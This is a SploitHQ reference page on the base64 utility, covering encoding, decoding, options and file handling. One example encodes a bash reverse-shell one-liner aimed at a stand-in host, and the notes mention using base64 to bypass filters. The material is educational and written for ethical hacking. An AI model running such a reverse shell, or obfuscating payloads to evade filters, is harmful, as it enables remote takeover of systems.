# base64 – Encode and Decode Data

**base64** is a command-line utility used to encode and decode binary or text data using Base64 encoding. It is commonly used in scripting, data transmission, and CTFs to obfuscate or safely transport data through text-based channels like HTTP, email, or shell scripts.

🔗 [Use the Base64 Tool on SploitHQ](https://sploithq.com/base64)

---

## 🔍 What Can base64 Do?

- Encode binary data into readable ASCII
- Decode Base64 back into the original form
- Pipe input/output for use in scripts or payloads
- Handle both short strings and full files

---

## ⚙️ Basic Usage

### Encode a string:
```bash
echo -n 'hello' | base64
```

Output:
```
aGVsbG8=
```

### Decode a string:
```bash
echo 'aGVsbG8=' | base64 --decode
```

Output:
```
hello
```

---

## 🧰 Common Options

| Option          | Description                                 |
|-----------------|---------------------------------------------|
| `-w <num>`      | Wrap lines after `<num>` characters         |
| `-d`, `--decode`| Decode input instead of encoding             |
| `-i <file>`     | (MacOS) Read input from a file               |
| `-o <file>`     | (MacOS) Write output to a file               |

_Note: GNU/Linux and macOS versions of `base64` differ slightly in syntax._

---

## 🧪 Examples

### Encode the contents of a file:
```bash
base64 /bin/ls > encoded.txt
```

### Decode a file back to binary:
```bash
base64 -d encoded.txt > ls_copy
```

### Decode a JWT payload:
```bash
echo '<base64-payload>' | base64 --decode | jq .
```

### Encode a reverse shell payload:
```bash
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' | base64
```

---

## ⚠️ Notes

- Base64 is **not encryption** — it's simply encoding.
- Anyone can decode Base64 without a key.
- It is often used to bypass filters or obfuscate data in CTFs and payloads.

---

## 🌐 SploitHQ Live Base64 Tool

👉 [Use the Online Base64 Encoder/Decoder](https://sploithq.com/base64)

- Encode or decode interactively
- Supports plain strings and pasted file content
- Ideal for quick payload prep or de-obfuscation

---

## 🔗 Useful Links

- [base64 Man Page (die.net)](https://linux.die.net/man/1/base64)
- [CyberChef Base64 Tool](https://gchq.github.io/CyberChef/)
- [SploitHQ Base64 Encoder/Decoder](https://sploithq.com/base64)

---

## 📄 License

The base64 utility is included in GNU coreutils.  
This documentation is provided by [SploitHQ](https://sploithq.com) for use in ethical hacking, scripting, and data manipulation.
